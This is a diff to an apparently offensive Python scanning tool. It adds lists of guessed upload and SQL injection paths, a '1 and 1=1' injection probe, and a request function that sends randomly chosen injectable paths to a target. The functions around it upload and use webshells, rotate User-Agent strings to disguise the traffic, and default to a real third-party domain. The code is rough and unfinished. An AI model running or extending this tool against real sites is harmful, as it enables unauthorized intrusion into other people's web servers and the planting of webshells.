@@ -22,7 +22,10 @@ HADER={
 'Pragma': 'no-cache',
 'Cache-Control': 'no-cache'
 }
+
 uppaths={1:'upload.php',2:'upload',3:'?/upload',4:'?mothod=upload',5:'?c=upload'}
+sqlipaths={1:'news.php?id=',2:'?id=',3:'search.php?name=',4:'login.php?name=',5:'?c=edit&m='}
+sqlis={1:'1 and 1=1',2:'',3:'',4:'',5:'',6:''}
 def gen_str(mode=0):
     table = 'abcdefghijklmnopqrstuvwxyz0123456789'
     if(mode==1):
@@ -37,8 +40,10 @@ def webshell_upload(url='http://www.baidu.com/'):
     encode_data = encode_multipart_formdata(data)
     r = requests.post(url,data=encode_data[0],headers=dict(HADER,**{'User-Agent':UA[random.randint(1, 4)],'Content-Type':encode_data[1]}))
     print (r.text)
-def SQLI():
+def SQLI(url='http://www.baidu.com/'):
     mode=1
+    url+=sqlipaths[random.randint(1, 5)]
+    r = requests.get(url,headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
     print('test3')
     r =requests.get('https://www.baidu.com/')
 def webshell_useing():
